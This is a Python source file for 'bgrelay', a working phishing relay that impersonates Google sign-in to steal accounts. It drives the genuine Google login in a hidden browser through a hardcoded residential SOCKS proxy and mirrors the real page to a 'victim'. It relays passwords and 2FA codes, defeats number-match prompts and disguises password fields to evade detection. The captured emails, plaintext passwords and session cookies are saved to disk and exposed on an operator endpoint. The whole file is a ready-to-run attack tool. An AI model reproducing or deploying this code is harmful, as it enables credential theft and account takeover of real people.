#!/usr/bin/env python3
"""bgrelay — real-browser relay for Google sign-in (botguard-safe, DOM mirror).

Architecture (user-approved): re-render as much of the REAL Google page as
possible on the victim side via DOM mirroring — the sidecar (patchright,
headful Xvfb, residential exit) drives the genuine accounts.google.com flow
and every poll ships (1) the card's outerHTML + the page's CSS with resource
URLs rewritten through /__relay/api/res, and (2) a cropped live screenshot
used as the transition/fallback layer. The victim types directly into the
mirrored REAL inputs; submits are intercepted and relayed to the sidecar.
Only what cannot be re-rendered (mid-transition states) falls back to the
live image.

Endpoints (behind evilginx /__relay/ or a relay LURE path):
  GET  /                       victim page
  POST /api/start {email?}     -> {id}
  GET  /api/state?id=&h=<hash> -> {state, hint, need_input, match_number,
                                   screenshot, dom, styles, dom_hash}
  POST /api/input {id,kind,value}
  GET  /api/res?u=<url>        cached sidecar-loaded asset (css/font/img)
  GET  /api/sessions (X-Op-Key)

Env: RELAY_SOCKS, RELAY_PORT (9445), RELAY_BRIDGE_PORT (8119), RELAY_STORE.
"""

import base64
import hashlib
import json
import os
import queue
import re
import secrets
import socket
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs, quote

from patchright.sync_api import sync_playwright

RELAY_PORT = int(os.environ.get("RELAY_PORT", "9445"))
BRIDGE_PORT = int(os.environ.get("RELAY_BRIDGE_PORT", "8119"))
SOCKS = os.environ.get(
    "RELAY_SOCKS",
    "socks5://ceGKVX:YqWshv@14.224.158.32:48726",
)
OP_KEY = os.environ.get("RELAY_OP_KEY") or secrets.token_hex(12)
STORE_DIR = os.path.expanduser(os.environ.get("RELAY_STORE", "~/bgrelay-store"))
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36")
SIGNIN_URL = "https://accounts.google.com/ServiceLogin?hl=en&continue=https%3A%2F%2Fmail.google.com%2F"

# global asset cache shared by sessions (styles/fonts identical per page)
RES_CACHE = {}
RES_LOCK = threading.Lock()
ASSET_HOSTS = ("gstatic.com", "googleapis.com", "googleusercontent.com",
               "google.com", "google.vn")

os.makedirs(STORE_DIR, exist_ok=True)


# ---------------------------------------------------------------- bridge ---
def parse_socks():
    m = re.match(r"socks5://([^:]+):([^@]+)@([\d.]+):(\d+)", SOCKS)
    if not m:
        sys.exit("RELAY_SOCKS must be socks5://user:pass@host:port")
    return m.group(3), int(m.group(4)), m.group(1), m.group(2)


def start_bridge():
    """Local HTTP CONNECT proxy -> upstream SOCKS5 (chromium can't do socks auth)."""
    import socks as pysocks  # pip pysocks

    up_host, up_port, up_user, up_pass = parse_socks()

    def pipe(a, b):
        try:
            while True:
                d = a.recv(65536)
                if not d:
                    break
                b.sendall(d)
        except Exception:
            pass
        finally:
            for s in (a, b):
                try:
                    s.close()
                except Exception:
                    pass

    def handle(c):
        try:
            req = b""
            while b"\r\n\r\n" not in req:
                chunk = c.recv(4096)
                if not chunk:
                    return
                req += chunk
            line = req.split(b"\r\n")[0].decode()
            method, target = line.split()[0], line.split()[1]
            if method != "CONNECT":
                c.sendall(b"HTTP/1.1 405 CONNECT only\r\n\r\n")
                return
            host, port = target.rsplit(":", 1)
            s = pysocks.socksocket()
            s.set_proxy(pysocks.SOCKS5, up_host, up_port, True, up_user, up_pass)
            s.settimeout(30)
            s.connect((host, int(port)))
            s.settimeout(None)
            c.sendall(b"HTTP/1.1 200 Connected\r\n\r\n")
            threading.Thread(target=pipe, args=(c, s), daemon=True).start()
            pipe(s, c)
        except Exception:
            try:
                c.close()
            except Exception:
                pass

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", BRIDGE_PORT))
    srv.listen(64)
    print(f"[bridge] 127.0.0.1:{BRIDGE_PORT} -> {up_host}:{up_port}", flush=True)
    while True:
        threading.Thread(target=handle, args=(srv.accept()[0],), daemon=True).start()


def ensure_xvfb():
    display = os.environ.get("DISPLAY", ":99")
    num = display.lstrip(":").split(".")[0]
    try:
        subprocess.run(["xdpyinfo", "-display", f":{num}"], check=True,
                       capture_output=True, timeout=5)
        return display
    except Exception:
        subprocess.Popen(["Xvfb", f":{num}", "-screen", "0", "1366x768x24"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1.5)
        return display


# ------------------------------------------------------------- asset ops ---
FETCH_JS = """async u => {
  const r = await fetch(u);
  const b = await r.arrayBuffer();
  const u8 = new Uint8Array(b);
  let s = '';
  for (let i = 0; i < u8.length; i += 8192)
    s += String.fromCharCode.apply(null, u8.subarray(i, i + 8192));
  return {ct: r.headers.get('content-type') || '', b64: btoa(s)};
}"""


def res_proxy_url(u):
    return "/__relay/api/res?u=" + quote(u, safe="")


def rewrite_css_urls(css_text, base_url):
    """Rewrite url(...) references to the res proxy. Returns (css, found_urls)."""
    found = []

    def repl(m):
        raw = m.group(1).strip().strip('"').strip("'")
        if raw.startswith("data:") or raw.startswith("#"):
            return m.group(0)
        if raw.startswith("//"):
            raw = "https:" + raw
        elif raw.startswith("/"):
            p = urlparse(base_url)
            raw = f"{p.scheme}://{p.netloc}{raw}"
        elif not raw.startswith("http"):
            p = urlparse(base_url)
            raw = f"{p.scheme}://{p.netloc}/{raw}"
        host = urlparse(raw).hostname or ""
        if not any(host == h or host.endswith("." + h) for h in ASSET_HOSTS):
            return m.group(0)
        found.append(raw)
        return f"url({res_proxy_url(raw)})"

    css = re.sub(r"url\(([^)]+)\)", repl, css_text)
    return css, found


def fetch_via_bridge(url):
    """Server-side fetch through the residential bridge — immune to page CORS."""
    import urllib.request
    proxy = urllib.request.ProxyHandler({
        "http": f"http://127.0.0.1:{BRIDGE_PORT}",
        "https": f"http://127.0.0.1:{BRIDGE_PORT}"})
    opener = urllib.request.build_opener(proxy)
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    with opener.open(req, timeout=15) as r:
        return (r.headers.get("Content-Type", "").split(";")[0].strip()
                or "application/octet-stream"), r.read()


def fetch_asset(pg, url, budget):
    """Fetch via the sidecar page (cookies/CORS correct); store in RES_CACHE."""
    with RES_LOCK:
        if url in RES_CACHE:
            return True
    if budget["n"] <= 0 or budget["bytes"] > 4 * 1024 * 1024:
        return False
    try:
        try:
            r = pg.evaluate(FETCH_JS, url)
            ct = r["ct"].split(";")[0].strip() or "application/octet-stream"
            raw = base64.b64decode(r["b64"])
        except Exception:
            ct, raw = fetch_via_bridge(url)
        if len(raw) > 512 * 1024:
            return False
        with RES_LOCK:
            RES_CACHE[url] = (ct, raw)
        budget["n"] -= 1
        budget["bytes"] += len(raw)
        return True
    except Exception as e:
        print(f"[res-miss] {url[:90]}: {str(e)[:80]}", flush=True)
        return False


# --------------------------------------------------------------- session ---
class RelaySession(threading.Thread):

    def __init__(self, sid, email=None):
        super().__init__(daemon=True)
        self.id = sid
        self.email = email
        self.password = None
        self.state = "init"
        self.hint = "Đang mở trang đăng nhập…"
        self.need_input = None
        self.screenshot = None          # b64 jpeg fallback/transition layer
        self.match_number = None
        self.error = None
        self.cookies = None
        self.inputs = queue.Queue()
        self.last_active = time.time()
        self.deadline = time.time() + 8 * 60
        self.finished = False
        # DOM mirror payload
        self.dom = None
        self.dom_hash = None
        self.styles = []                # rewritten CSS texts (stable per page)
        self._res_budget = {"n": 24, "bytes": 0}  # card-asset prefetch budget

    # -- helpers ------------------------------------------------------------
    def _body(self, pg):
        try:
            return pg.inner_text("body")
        except Exception:
            return ""

    def _visible(self, pg, sel):
        try:
            return pg.locator(sel).first.is_visible()
        except Exception:
            return False

    # ---- DOM mirror -------------------------------------------------------
    def _prefetch_assets(self, pg):
        """One-shot: collect inline styles + external sheets + their assets."""
        budget = {"n": 16, "bytes": 0}
        styles = []
        try:
            inline = pg.evaluate(
                "() => [...document.querySelectorAll('style')].map(s => s.textContent)")
            for txt in inline or []:
                css, urls = rewrite_css_urls(txt, SIGNIN_URL)
                for u in urls:
                    fetch_asset(pg, u, budget)
                styles.append(css)
        except Exception as e:
            print(f"[assets-inline] {str(e)[:100]}", flush=True)
        try:
            sheets = pg.evaluate(
                "() => [...document.styleSheets].filter(s => s.href).map(s => s.href)")
            for href in (sheets or [])[:6]:
                if not fetch_asset(pg, href, {"n": 1, "bytes": 0}):
                    continue
                with RES_LOCK:
                    raw = RES_CACHE.get(href)
                if not raw:
                    continue
                css_text = raw[1].decode("utf-8", "replace")
                css, urls = rewrite_css_urls(css_text, href)
                for u in urls:
                    fetch_asset(pg, u, budget)
                styles.append(css)
        except Exception as e:
            print(f"[assets-sheets] {str(e)[:100]}", flush=True)
        # CSD disguise for mirrored password fields
        styles.append("input[data-eg=pw]{-webkit-text-security:disc}")
        self.styles = styles
        print(f"[assets] {self.id}: {len(styles)} css blocks, "
              f"{len(RES_CACHE)} cached urls", flush=True)

    CARD_JS = """() => {
      const el = document.querySelector('#initialView')
              || document.querySelector('[role=main]')
              || document.querySelector('main');
      return el ? el.outerHTML : null;
    }"""

    def _dom_snapshot(self, pg):
        try:
            html = pg.evaluate(self.CARD_JS)
            if not html:
                return
            html = re.sub(r"<script[\s\S]*?</script>", "", html)
            # CSD: mirrored password inputs never exist as type=password
            html = html.replace('type="password"', 'type="text" data-eg="pw"')

            lazy_urls = []

            ATTR_HOSTS = ("gstatic.com", "googleusercontent.com", "googleapis.com")

            def attr_repl(m):
                attr, url = m.group(1), m.group(2)
                host = urlparse(url).hostname or ""
                if any(host == h or host.endswith("." + h) for h in ATTR_HOSTS):
                    lazy_urls.append(url)
                    return f'{attr}="{res_proxy_url(url)}"'
                return m.group(0)

            html = re.sub(r'(src|href)="(https://[^"]+)"', attr_repl, html)
            # lazily prefetch card assets (logo svg, avatars...) for /api/res
            for u in dict.fromkeys(lazy_urls):
                fetch_asset(pg, u, self._res_budget)
            h = hashlib.md5(html.encode()).hexdigest()[:12]
            if h != self.dom_hash:
                self.dom = html
                self.dom_hash = h
        except Exception:
            pass

    def _stream(self, pg):
        """Refresh the mirror: DOM snapshot + screenshot + number extraction."""
        self._dom_snapshot(pg)
        try:
            shot = None
            for sel in ("#initialView", "div[role='main']", "main"):
                try:
                    loc = pg.locator(sel).first
                    if loc.is_visible():
                        box = loc.bounding_box()
                        if box and box["width"] > 250 and box["height"] > 150:
                            shot = loc.screenshot(type="jpeg", quality=62)
                            break
                except Exception:
                    continue
            if shot is None:
                shot = pg.screenshot(type="jpeg", quality=60,
                                     clip={"x": 171, "y": 64, "width": 1024, "height": 640})
            self.screenshot = base64.b64encode(shot).decode()
        except Exception as e:
            if not getattr(self, "_shot_err_logged", False):
                self._shot_err_logged = True
                print(f"[shot-err] {self.id}: {type(e).__name__}: {str(e)[:160]}", flush=True)
        try:
            body = self._body(pg)
            cands = re.findall(r"(?m)^\s*(\d{2})\s*$", body)
            if not cands:
                cands = re.findall(r"(?<!\d)(\d{2})(?!\d)", body[:400])
            if cands and self.state == "challenge":
                self.match_number = cands[0]
        except Exception:
            pass

    def _classify(self, pg):
        host = (urlparse(pg.url).hostname or "").lower()
        body = self._body(pg)
        if host in ("mail.google.com", "myaccount.google.com"):
            return "done"
        if self._visible(pg, "input[name='Passwd']") or self._visible(pg, "input[type='password']"):
            return "password"
        low = body.lower()
        if self._visible(pg, "input[name='totpPin']") or "enter a code" in low \
                or "verify it" in low or "2-step" in low:
            return "challenge"
        if "couldn" in low and "find" in low:
            return "error_bad_account"
        if "wrong password" in low:
            return "password_retry"
        if "not be secure" in low:
            return "error_botguard"
        return None

    def _wait_input(self, pg, kind, hint):
        """Wait for the victim's input while keeping the mirror streaming."""
        self.state = {"code": "challenge", "email": "init_email"}.get(kind, kind)
        self.need_input = kind
        self.hint = hint
        remaining = max(1.0, self.deadline - time.time())
        rounds = int(remaining / 1.2) + 1
        for _ in range(rounds):
            try:
                item = self.inputs.get(timeout=1.2)
                self.last_active = time.time()
                return item
            except queue.Empty:
                self._stream(pg)
                if time.time() > self.deadline:
                    return ("abort", None)
        return ("abort", None)

    def _collect(self, pg):
        out = []
        try:
            for c in pg.context.cookies():
                dom = c.get("domain", "")
                if "google.com" in dom:
                    out.append({"name": c["name"], "value": c["value"],
                                "domain": dom, "path": c.get("path", "/"),
                                "expires": c.get("expires", -1)})
        except Exception:
            pass
        return out

    def _finish(self, pg, state, hint=""):
        self.state = state
        self.hint = hint
        self.need_input = None
        self.finished = True
        try:
            self._stream(pg)
        except Exception:
            pass
        if state == "done":
            self.cookies = self._collect(pg)
            rec = {"id": self.id, "email": self.email, "password": self.password,
                   "cookies": self.cookies, "ua": UA, "ts": int(time.time())}
            path = os.path.join(STORE_DIR, self.id + ".json")
            with open(path, "w") as f:
                json.dump(rec, f, indent=1)
            print(f"[capture] {self.email} -> {path} "
                  f"({len(self.cookies)} cookies)", flush=True)

    # -- main loop ----------------------------------------------------------
    def run(self):
        os.environ["DISPLAY"] = ensure_xvfb()
        pw = None
        try:
            pw = sync_playwright().start()
            browser = pw.chromium.launch(
                headless=False,
                args=["--no-sandbox", "--disable-dev-shm-usage",
                      "--window-size=1366,768"],
                proxy={"server": f"http://127.0.0.1:{BRIDGE_PORT}"})
            pg = browser.new_page(user_agent=UA, locale="en-US",
                                  viewport={"width": 1366, "height": 768})
            pg.goto(SIGNIN_URL, wait_until="load", timeout=60000)
            pg.wait_for_selector("#identifierId", timeout=20000)
            pg.wait_for_selector("#identifierNext", state="visible", timeout=20000)
            time.sleep(2)  # let the v3 app finish booting so the click registers
            self._prefetch_assets(pg)
            if not self.email:
                # mirror-first: the victim interacts with the REAL mirrored
                # identifier card — no fake UI anywhere
                item = self._wait_input(pg, "email", "Nhập email của bạn")
                if item[0] == "abort":
                    self._finish(pg, "error", "Hết thời gian phiên")
                    browser.close()
                    return
                self.email = item[1]
            pg.fill("#identifierId", self.email)
            time.sleep(0.5)
            pg.click("#identifierNext")

            # ---- identifier -> password / challenge / error -------------
            st = None
            for i in range(45):
                time.sleep(1)
                self._stream(pg)
                st = self._classify(pg)
                if st:
                    break
            if st in (None, "error_bad_account", "error_botguard"):
                self._finish(pg, "error",
                             "Không tìm thấy tài khoản Google này." if st == "error_bad_account"
                             else "Google tạm thời từ chối — thử lại sau.")
                browser.close()
                return
            retries = 0
            while time.time() < self.deadline:
                if st in ("password", "password_retry"):
                    item = self._wait_input(pg, "password",
                                            "Nhập mật khẩu của tài khoản " + str(self.email))
                    if item[0] == "abort":
                        break
                    if self.password is None:
                        self.password = item[1]
                    try:
                        pg.fill("input[name='Passwd']", item[1], timeout=5000)
                    except Exception:
                        pg.fill("input[type='password']", item[1])
                    pg.click("#passwordNext")
                    time.sleep(5)
                    st = self._classify(pg) or "wait"
                    for _ in range(12):
                        if st in ("password", "challenge", "done", "password_retry"):
                            break
                        time.sleep(1)
                        self._stream(pg)
                        st = self._classify(pg) or st
                    if st == "password_retry":
                        retries += 1
                        if retries >= 3:
                            self._finish(pg, "error", "Quá nhiều lần sai mật khẩu.")
                            break
                elif st == "challenge":
                    body = self._body(pg)
                    if self._visible(pg, "input[name='totpPin']") or "enter a code" in body.lower():
                        item = self._wait_input(pg, "code", "Nhập mã xác minh")
                        if item[0] == "abort":
                            break
                        sel = "input[name='totpPin']" if self._visible(pg, "input[name='totpPin']") \
                            else "input[type='tel'], input[name='code']"
                        pg.fill(sel, item[1])
                        pg.click("#totpNext, button:has-text('Next')")
                        time.sleep(5)
                    else:
                        # Google prompt / number match — stream until approved
                        self.state = "challenge"
                        self.hint = "Phê duyệt trên điện thoại (nhập số hiển thị vào app)"
                        self.need_input = None
                        for _ in range(150):
                            time.sleep(1.2)
                            self._stream(pg)
                            st2 = self._classify(pg)
                            if st2 in ("done", "challenge", "password"):
                                st = st2
                                break
                        else:
                            st = None
                        continue
                    st = self._classify(pg) or "wait"
                    for _ in range(12):
                        if st in ("password", "challenge", "done", "password_retry"):
                            break
                        time.sleep(1)
                        self._stream(pg)
                        st = self._classify(pg) or st
                elif st == "done":
                    self._finish(pg, "done", "Đăng nhập thành công")
                    break
                else:
                    time.sleep(1.2)
                    self._stream(pg)
                    st = self._classify(pg) or st
            else:
                self._finish(pg, "error", "Hết thời gian phiên")
            browser.close()
        except Exception as e:
            self.state = "error"
            self.error = str(e)[:200]
            self.hint = "Lỗi phiên đăng nhập"
            self.finished = True
            print(f"[error] {self.id}: {e}", flush=True)
        finally:
            if pw:
                try:
                    pw.stop()
                except Exception:
                    pass


SESSIONS = {}
LOCK = threading.Lock()


def public_state(s, client_hash=None):
    out = {"id": s.id, "state": s.state, "hint": s.hint,
           "need_input": s.need_input, "match_number": s.match_number,
           "screenshot": s.screenshot, "dom_hash": s.dom_hash,
           "dom": None, "styles": None}
    if s.dom_hash and s.dom_hash != client_hash:
        out["dom"] = s.dom
        out["styles"] = s.styles
    return out


# ------------------------------------------------------------------ page ---
PAGE = """<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=google content=notranslate>
<title>Sign in - Google Accounts</title>
<style>
*{box-sizing:border-box}
html,body{margin:0;background:#fff;height:100%}
body{font-family:Arial,sans-serif;display:flex;flex-direction:column;color:#202124}
.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:12px;min-height:76vh}
#box{width:100%;max-width:980px;position:relative}
#cardhost{filter:blur(16px);transition:filter .3s;min-height:300px}
#cardhost.on{filter:none}
#mirror{display:none;width:100%;height:auto;border-radius:10px}
#mirror.show{display:block}
#boot{margin:44px auto 12px;width:30px;height:30px;border:3px solid #dadce0;
 border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
@keyframes r{to{transform:rotate(360deg)}}
#num{display:none;background:#e8f0fe;color:#0b57d0;font-size:40px;font-weight:600;
 padding:12px 32px;border-radius:14px;margin:0 auto 14px;letter-spacing:8px;width:fit-content}
#bar{margin:14px auto 0;display:flex;gap:8px;max-width:520px}
#bar.off{display:none}
#rinp{flex:1;padding:12px 14px;font-size:15px;border:1px solid #dadce0;border-radius:8px;outline:none;text-align:center}
#rinp.egpw{-webkit-text-security:disc}
#rgo{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 22px;font-size:14px;cursor:pointer}
#st{margin:8px auto 0;font-size:13px;color:#5f6368;min-height:18px;text-align:center}
#st.err{color:#d93025}
.foot{padding:10px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
.foot .l{display:flex;gap:18px}
</style></head><body>
<div class=wrap><div id=box>
<div id=boot></div>
<div id=num style="display:none">00</div>
<div id=cardhost></div>
<img id=mirror alt="">
<div id=bar class=off><input id=rinp autocomplete=off><button id=rgo>Tiếp tục</button></div>
<div id=st></div>
</div></div>
<div class=foot><div class=l><span>English (United States)</span></div>
<div class=l><span>Help</span><span>Privacy</span><span>Terms</span></div></div>
<script>
var SID=null, KIND=null, lastHash=null, processing=false,
    card=document.getElementById('cardhost'), mirror=document.getElementById('mirror'),
    boot=document.getElementById('boot'), numEl=document.getElementById('num'),
    st=document.getElementById('st'), bar=document.getElementById('bar'),
    rinp=document.getElementById('rinp'), rgo=document.getElementById('rgo');
var PLACE={email:'Email or phone',password:'Mật khẩu',code:'Mã xác minh'};
['pointermove','keydown','touchstart'].forEach(function(ev){
 document.addEventListener(ev,function(){card.classList.add('on');},{once:true,capture:true});});
function setSt(t,err){st.textContent=t||'';st.className=err?'err':'';}
function findSel(){
 if(card.querySelector('#identifierId'))return['#identifierId','email'];
 var p=card.querySelector('input[data-eg=pw]')||card.querySelector('input[name=Passwd]');
 if(p)return['input[data-eg=pw],input[name=Passwd]','password'];
 var c=card.querySelector('input[name=totpPin]')||card.querySelector('input[type=tel]');
 if(c)return['input[name=totpPin],input[type=tel]','code'];
 return null;}
function relaySubmit(){
 var f=findSel();if(!f)return;
 var el=card.querySelector(f[0]);if(!el||!el.value)return;
 KIND=f[1];processing=true;mirror.classList.add('show');
 var v=el.value;
 fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({id:SID,kind:KIND,value:v})}).catch(function(){setSt('Lỗi mạng',1);});
 setSt('Đang xử lý…');
}
card.addEventListener('click',function(e){
 var b=e.target.closest('button,div[role=button],input[type=submit]');
 if(b){e.preventDefault();e.stopPropagation();relaySubmit();}
},true);
card.addEventListener('keydown',function(e){
 if(e.key==='Enter'){e.preventDefault();relaySubmit();}
},true);
function fallbackBar(kind){
 bar.className='';KIND=kind;rinp.className=kind==='password'?'egpw':'';
 rinp.placeholder=PLACE[kind]||'';rinp.focus();}
rgo.onclick=function(){if(rinp.value){
 fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({id:SID,kind:KIND,value:rinp.value})}).then(function(){rinp.value='';bar.className='off';});}};
rinp.onkeydown=function(k){if(k.key==='Enter')rgo.onclick();};
function render(x){
 if(x.dom_hash&&x.dom_hash!==lastHash){
  lastHash=x.dom_hash;
  var gs=document.getElementById('gs');
  if(x.styles){
   var txt=x.styles.join('\\n');
   if(gs){gs.textContent=txt;}
   else{gs=document.createElement('style');gs.id='gs';gs.textContent=txt;document.head.appendChild(gs);}
  }
  if(x.dom){card.innerHTML=x.dom;boot.style.display='none';card.classList.add('on');}
  processing=false;mirror.classList.remove('show');
  var f=findSel();
  if(f){var el=card.querySelector(f[0]);if(el&&!el.value){setTimeout(function(){el.focus();},120);}}
 }
 if(x.screenshot&&(processing||!lastHash)){
  mirror.src='data:image/jpeg;base64,'+x.screenshot;
  mirror.classList.add('show');boot.style.display='none';
  if(!lastHash){card.innerHTML='';}
 }
 if(x.match_number){numEl.style.display='block';numEl.textContent=x.match_number;}
 if(x.state==='done'){setSt('');bar.className='off';
  card.innerHTML='<div style="text-align:center;margin:30px 0"><svg width=56 height=56 viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#34A853" stroke-width="2"/><path d="M7 12.5l3.2 3.2L17 9" stroke="#34A853" stroke-width="2" fill="none"/></svg><div style="font-size:20px;margin-top:10px">Bạn đã đăng nhập thành công</div><div style="color:#5f6368;font-size:14px;margin-top:6px">Đang chuyển tới Gmail…</div></div>';
  setTimeout(function(){location.href='https://mail.google.com';},2600);return;}
 if(x.state==='error'){setSt(x.hint||'Không thể đăng nhập',1);return;}
 if(x.need_input&&!lastHash&&!KIND){fallbackBar(x.need_input);}
}
function poll(){
 if(!SID){setTimeout(poll,900);return;}
 fetch('/__relay/api/state?id='+SID+'&h='+(lastHash||'')).then(function(r){return r.json();})
  .then(function(x){render(x);setTimeout(poll,1200);})
  .catch(function(){setTimeout(poll,2200);});
}
setSt('Đang mở trang đăng nhập…');
fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({})}).then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
 .catch(function(){setSt('Lỗi mạng — tải lại trang',1);});
poll();
</script></body></html>"""


# ---------------------------------------------------------------- server ---
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path, _, query = self.path.partition("?")
        qs = parse_qs(query)
        if path in ("/", "/index.html"):
            body = PAGE.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)
        elif path == "/api/state":
            sid = (qs.get("id", [""])[0])[:40]
            s = SESSIONS.get(sid)
            if not s:
                return self._json({"error": "no session"}, 404)
            return self._json(public_state(s, (qs.get("h", [None])[0])))
        elif path == "/api/res":
            u = qs.get("u", [""])[0]
            with RES_LOCK:
                hit = RES_CACHE.get(u)
            if not hit:
                return self._json({"error": "not found"}, 404)
            ct, raw = hit
            self.send_response(200)
            self.send_header("Content-Type", ct)
            self.send_header("Content-Length", str(len(raw)))
            self.send_header("Cache-Control", "public, max-age=86400")
            self.end_headers()
            self.wfile.write(raw)
        elif path == "/api/sessions":
            if self.headers.get("X-Op-Key") != OP_KEY:
                return self._json({"error": "forbidden"}, 403)
            out = []
            for s in SESSIONS.values():
                out.append({"id": s.id, "email": s.email,
                            "state": s.state, "password": s.password,
                            "cookie_count": len(s.cookies or [])})
            return self._json(out)
        else:
            self._json({"error": "not found"}, 404)

    def do_POST(self):
        path = self.path.split("?")[0]
        length = int(self.headers.get("Content-Length", "0"))
        try:
            data = json.loads(self.rfile.read(length) or b"{}")
        except Exception:
            return self._json({"error": "bad json"}, 400)
        if path == "/api/start":
            email = (data.get("email") or "").strip()[:120]
            if email and not re.match(r"[^@\s]+@[^@\s]+\.[^@\s]+", email):
                return self._json({"error": "bad email"}, 400)
            if not email:
                email = None
            sid = secrets.token_hex(8)
            s = RelaySession(sid, email)
            with LOCK:
                SESSIONS[sid] = s
            s.start()
            print(f"[session] {sid} start email={email}", flush=True)
            return self._json({"id": sid})
        if path == "/api/input":
            s = SESSIONS.get((data.get("id") or "")[:40])
            if not s:
                return self._json({"error": "no session"}, 404)
            s.last_active = time.time()
            s.inputs.put((data.get("kind"), (data.get("value") or "")[:200]))
            return self._json({"ok": True})
        self._json({"error": "not found"}, 404)


def reaper():
    while True:
        time.sleep(60)
        with LOCK:
            for sid in list(SESSIONS):
                s = SESSIONS[sid]
                if s.finished and time.time() - s.last_active > 15 * 60:
                    del SESSIONS[sid]


if __name__ == "__main__":
    print(f"[bgrelay] port={RELAY_PORT} store={STORE_DIR}", flush=True)
    print(f"[bgrelay] OP_KEY={OP_KEY}", flush=True)
    threading.Thread(target=start_bridge, daemon=True).start()
    threading.Thread(target=reaper, daemon=True).start()
    ensure_xvfb()
    ThreadingHTTPServer(("127.0.0.1", RELAY_PORT), Handler).serve_forever()
